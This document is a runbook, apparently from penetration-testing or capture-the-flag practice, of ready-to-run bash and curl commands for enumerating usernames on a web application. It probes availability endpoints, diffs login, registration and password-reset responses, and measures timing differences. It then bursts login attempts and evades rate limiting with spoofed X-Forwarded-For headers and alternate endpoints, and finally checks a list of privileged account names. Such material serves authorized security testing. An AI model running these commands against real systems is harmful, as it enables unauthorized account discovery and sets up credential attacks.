# Field manual (deep) — the on-target runbook, every step

## Setup

```bash
BASE="https://target"
python3 tools/web/enum_probe.py --selftest   # the tool works
# register your account -> KNOWN_GOOD
KNOWN_GOOD="myaccount"
FAKE1="zzz-$(head -c4 /dev/urandom|xxd -p)"
FAKE2="qqq-$(head -c4 /dev/urandom|xxd -p)"
```

## The direct-oracle sweep (one pass, cheapest first)

```bash
for ep in /api/username-available /api/check-username /api/user-exists \
          /api/available /check-username; do
  for u in "$KNOWN_GOOD" "$FAKE1"; do
    printf '%s?u=%s -> ' "$ep" "$u"
    curl -s "$BASE$ep?u=$u" | head -c 80; echo
  done
done
```

A `{"available":false}`/`{"exists":true}`/`{"taken":true}` → the class
is confirmed; the list is next.

## The per-form oracle sweep

```bash
for form in login register forgot-password; do
  echo "=== $form ==="
  python3 tools/web/enum_probe.py --url "$BASE/$form" \
    --body "user={U}&pass=x" --known-user "$KNOWN_GOOD" --method POST 2>&1 | tail -8
done
```

## The manual channel diffs (when a form needs a custom body)

```bash
probe() {
  curl -i -X POST -d "$2" "$BASE/$1" > "/tmp/g_$1"
  curl -i -X POST -d "${2/$KNOWN_GOOD/$FAKE1}" "$BASE/$1" > "/tmp/b_$1"
  diff "/tmp/g_$1" "/tmp/b_$1" | head
}
probe login 'user=myaccount&pass=x'
```

## The timing baseline

```bash
t() { for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d "user=$1&pass=x" "$BASE/$2"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d "user=$FAKE1&pass=x" "$BASE/$2"
done | awk '{a[$1]+=$2;c[$1]++}END{print "good",a["g"]/c["g"],"bad",a["b"]/c["b"],"delta",a["g"]/c["g"]-a["b"]/c["b"]}'; }
t "$KNOWN_GOOD" login
```

## The throttle burst + bypass

```bash
for i in $(seq 15); do curl -s -o /dev/null -w '%{http_code} ' -X POST -d "user=t$i&pass=x" "$BASE/login"; done
# if 429/423 -> the bypass set:
curl -s -o /dev/null -w '%{http_code}\n' -X POST -H 'X-Forwarded-For: 9.9.9.9' -d 'user=x&pass=y' "$BASE/login"
curl -s -X POST -d 'user=x&pass=y' "$BASE/login"   # fresh session
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{"username":"x","password":"y"}' -H 'Content-Type: application/json' "$BASE/api/login"
```

## The bounded list

```bash
for u in admin administrator root test service backup deploy ci jenkins gitlab flag; do
  printf '%-15s ' "$u"; curl -s "$BASE/api/username-available?u=$u" | head -c 60; echo
done
```

## The close

Every finding verbatim-recorded; every name routed; every closed cell a
negative; `../field-notes.md` updated.
